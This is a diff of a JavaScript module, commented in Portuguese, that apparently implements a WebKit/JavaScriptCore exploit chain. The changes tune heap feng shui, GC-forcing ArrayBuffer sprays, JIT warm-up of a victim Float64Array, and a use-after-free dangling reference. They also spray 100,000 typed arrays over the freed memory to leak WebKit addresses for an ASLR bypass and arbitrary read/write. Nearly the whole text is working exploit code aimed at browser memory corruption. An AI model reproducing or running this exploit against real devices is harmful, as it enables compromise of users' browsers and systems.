@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v158 - Heap Feng Shui e Reocupação Otimizada)
+// js/script3/testArrayBufferVictimCrash.mjs (v159 - Heap Feng Shui, Spray Patterns e Re-checagem)
 
 // =======================================================================================
 // ESTA É A VERSÃO FINAL QUE INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
@@ -26,14 +26,14 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v158_FENGSHUI";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v159_REOCUP_PATTERN";
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
 const LOCAL_SHORT_PAUSE = 100;
 const LOCAL_MEDIUM_PAUSE = 750;
 const LOCAL_LONG_PAUSE = 1500;
-const LOCAL_CRITICAL_PAUSE = 3000; // Aumentado novamente para 3s
+const LOCAL_CRITICAL_PAUSE = 3500; // Aumentado para 3.5s
 
 let global_spray_objects = [];
 let hold_objects = []; // Para evitar que o GC colete objetos críticos prematuramente
@@ -238,11 +238,11 @@ async function triggerGC(logFn, pauseFn, aggressive = true) {
     logFn("    Acionando GC...", "info", "GC_Trigger");
     if (aggressive) {
         try {
-            for (let k = 0; k < 5; k++) { // Aumentar ciclos para 5
+            for (let k = 0; k < 5; k++) { // Manter 5 ciclos
                 let temp_spray = [];
                 // Variar mais os tamanhos para introduzir mais fragmentação e forçar diferentes buckets
-                const sizes = [1024 * 512, 1024 * 256, 1024 * 128, 1024 * 64, 1024 * 32];
-                for (let i = 0; i < 3000; i++) { // Aumentar iterações por ciclo para maior pressão (aprox. 1.5GB/ciclo)
+                const sizes = [1024 * 512, 1024 * 256, 1024 * 128, 1024 * 64, 1024 * 32, 1024 * 16]; // Mais tamanhos
+                for (let i = 0; i < 4000; i++) { // Aumentar iterações por ciclo para maior pressão (aprox. 2GB/ciclo)
                     temp_spray.push(new ArrayBuffer(sizes[i % sizes.length]));
                 }
                 temp_spray = null;
@@ -263,7 +263,7 @@ async function triggerGC(logFn, pauseFn, aggressive = true) {
         gc();
     }
     await pauseFn(LOCAL_CRITICAL_PAUSE);
-    for (let i = 0; i < 500; i++) { // Aumentar alocações pequenas para preencher micro-buracos
+    for (let i = 0; i < 500; i++) { // Manter 500 alocações pequenas
         new ArrayBuffer(1024);
     }
     await pauseFn(LOCAL_CRITICAL_PAUSE);
@@ -277,32 +277,35 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
     const VICTIM_SIZE_DOUBLES = VICTIM_SIZE_BYTES / 8; // 16 doubles
 
     // Heap Feng Shui: Criar buracos específicos para a vítima
-    const HOLE_COUNT = 2000;
-    const HOLE_SIZE_BYTES = VICTIM_SIZE_BYTES + (VICTIM_SIZE_BYTES / 2); // Levemente maior que a vítima para forçar um bucket
+    const HOLE_COUNT = 3000; // Aumentar o número de buracos
+    const HOLE_SIZE_BYTES = VICTIM_SIZE_BYTES; // Tentar tamanho EXATO da vítima
     let hole_fillers = [];
 
     // Preencher o heap com objetos de tamanhos variados para criar "buracos"
+    // Usar ArrayBuffers para mais controle de alocação de heap bruta
     for (let i = 0; i < HOLE_COUNT; i++) {
-        hole_fillers.push(new ArrayBuffer(HOLE_SIZE_BYTES + (i % 8))); // Variação de tamanho
-        if (i % 100 === 0) await pauseFn(LOCAL_VERY_SHORT_PAUSE);
+        // Criar objetos de tamanhos ligeiramente diferentes do alvo
+        hole_fillers.push(new ArrayBuffer(HOLE_SIZE_BYTES + (i % 16) + 0x10)); // Variação de tamanho + offset para evitar colisão direta
+        if (i % 200 === 0) await pauseFn(LOCAL_VERY_SHORT_PAUSE);
     }
     await pauseFn(LOCAL_SHORT_PAUSE);
 
     // Liberar alguns dos "buracos" para a vítima
-    const victim_holes = [];
+    const victim_holes_to_free = [];
     for (let i = 0; i < HOLE_COUNT; i += 2) { // Liberar a cada 2 objetos para criar espaços
-        victim_holes.push(hole_fillers[i]);
-        hole_fillers[i] = null;
+        victim_holes_to_free.push(hole_fillers[i]);
+        hole_fillers[i] = null; // Torna elegível para GC
     }
     // Forçar GC para limpar os "buracos"
     if (typeof gc === 'function') {
         gc();
         await pauseFn(LOCAL_SHORT_PAUSE);
     }
-    logFn(`[UAF] Heap Feng Shui: ${victim_holes.length} buracos de ~${HOLE_SIZE_BYTES} bytes liberados.`, "info");
+    logFn(`[UAF] Heap Feng Shui: ${victim_holes_to_free.length} buracos de ~${HOLE_SIZE_BYTES} bytes liberados.`, "info");
     await pauseFn(LOCAL_MEDIUM_PAUSE); // Dar tempo para os buracos se formarem
 
-    // Alocar a vítima no "buraco" recém-formado
+    // Alocar a vítima no "buraco" recém-formado.
+    // A ordem de alocação é crucial aqui.
     let victim_object_arr = new Float64Array(VICTIM_SIZE_DOUBLES);
     victim_object_arr[0] = 1.000000000000123;
     for(let i = 1; i < VICTIM_SIZE_DOUBLES; i++) {
@@ -313,7 +316,7 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
     dangling_ref = victim_object_arr;
 
     // Aumentar iterações e pausas para forçar mais otimizações JIT na vítima.
-    for (let i = 0; i < 15000; i++) { // Mais iterações
+    for (let i = 0; i < 20000; i++) { // Mais iterações ainda
         victim_object_arr[0] += 0.000000000000001;
     }
     await pauseFn(LOCAL_VERY_SHORT_PAUSE);
@@ -327,8 +330,8 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
     const ref_index = hold_objects.indexOf(victim_object_arr);
     if (ref_index > -1) { hold_objects.splice(ref_index, 1); }
     victim_object_arr = null; // Remove a referência forte.
-    victim_holes.forEach((h, idx) => { // Também libera os buracos que não foram usados pela vítima
-        if (idx % 2 !== 0) victim_holes[idx] = null; // Libera os que não foram alocados para a vítima
+    victim_holes_to_free.forEach((h, idx) => { // Libera os buracos que não foram usados pela vítima
+        if (h !== null) victim_holes_to_free[idx] = null; // Garante que todos sejam liberados
     });
     hole_fillers = null; // Libera os fillers restantes
     await triggerGC(logFn, pauseFn, true);
@@ -336,7 +339,7 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
 
     logFn("--- FASE 4: Pulverizando Float64Array com ponteiros sobre a memória liberada (SPRAY FENG SHUI) ---", "subtest");
     const spray_arrays = [];
-    const SPRAY_COUNT_UAF_NEW = 70000; // Aumentado para 70.000 (maior chance de hit)
+    const SPRAY_COUNT_UAF_NEW = 100000; // Aumentado para 100.000 (maior chance de hit)
 
     const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000);
     const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
@@ -352,7 +355,10 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
 
     for (let i = 0; i < SPRAY_COUNT_UAF_NEW; i++) {
         try {
-            const view = new Float64Array(VICTIM_SIZE_DOUBLES);
+            // Tentar alocar objetos com o mesmo tamanho exato da vítima e também em tamanhos próximos.
+            // A ordem de alocação pode importar para alguns alocadores.
+            const current_size_doubles = (i % 2 === 0) ? VICTIM_SIZE_DOUBLES : VICTIM_SIZE_DOUBLES + 1; // Alternar tamanhos
+            const view = new Float64Array(current_size_doubles);
             view[0] = spray_value_double_to_leak_ptr;
             for (let j = 1; j < view.length; j++) {
                 view[j] = _int64ToDouble_direct(new AdvancedInt64(0xCDCDCDCD, 0xCDCDCDCD + j));
@@ -364,23 +370,19 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
         }
     }
     hold_objects.push(spray_arrays);
-    logFn(`    Pulverização de ${spray_arrays.length} Float64Array(s) de ${VICTIM_SIZE_BYTES} bytes concluída sobre a memória da vítima.`, "info");
+    logFn(`    Pulverização de ${spray_arrays.length} Float64Array(s) concluída sobre a memória da vítima (tamanhos ${VICTIM_SIZE_BYTES} e ${VICTIM_SIZE_BYTES + 8} bytes).`, "info");
 
     // Forçar re-leitura/re-otimização da dangling_ref após o spray
-    // Tentar acessar o dangling_ref de várias maneiras para forçar o JIT a recarregar
-    for (let i = 0; i < 5; i++) { // Várias leituras para tentar "refrescar" o cache
+    for (let i = 0; i < 10; i++) { // Mais tentativas de "refrescar" o cache
         const temp_read = dangling_ref[0];
-        // Tentar uma escrita também pode forçar a invalidação de cache
         try {
-            dangling_ref[1] = 0xBADDC0DE; // Apenas para forçar uma escrita
+            dangling_ref[1] = 0xBADDC0DE;
         } catch (e_write_dangling) {
-            // Pode falhar se o dangling_ref estiver corrompido, o que é esperado se a reocupação ocorrer
-            logFn(`[UAF] ALERTA: Erro ao tentar escrever em dangling_ref[1] para forçar refresh: ${e_write_dangling.message}`, "warn");
+            logFn(`[UAF] ALERTA: Erro ao tentar escrever em dangling_ref[1] para forçar refresh (i=${i}): ${e_write_dangling.message}`, "warn");
         }
         await pauseFn(LOCAL_VERY_SHORT_PAUSE);
     }
     logFn(`[UAF] Tentativas forçadas de re-leitura/re-otimização da dangling_ref concluídas.`, "debug");
-
 
     return dangling_ref;
 }
@@ -413,7 +415,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos OTIMIZADO) ---", "subtest");
         const sprayStartTime = performance.now();
-        const SPRAY_COUNT = 1000000;
+        const SPRAY_COUNT = 1500000; // Aumentado para 1.500.000 para maior estabilização
         logFn(`Iniciando spray de objetos (volume ${SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
         for (let i = 0; i < SPRAY_COUNT; i++) {
             const dataSize = 50 + (i % 50);
@@ -454,7 +456,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                  throw new Error("A referência pendurada não se tornou o Float64Array pulverizado.");
             }
 
-            let attempts = 40; // Aumentado para 40 tentativas de leitura para capturar o leak
+            let attempts = 50; // Aumentado para 50 tentativas de leitura para capturar o leak
             for(let i = 0; i < attempts; i++) {
                 leaked_jsvalue_from_uaf_double = dangling_ref_from_uaf[0];
                 if (typeof leaked_jsvalue_from_uaf_double === 'number' && !isNaN(leaked_jsvalue_from_uaf_double) && leaked_jsvalue_from_uaf_double !== 0) {
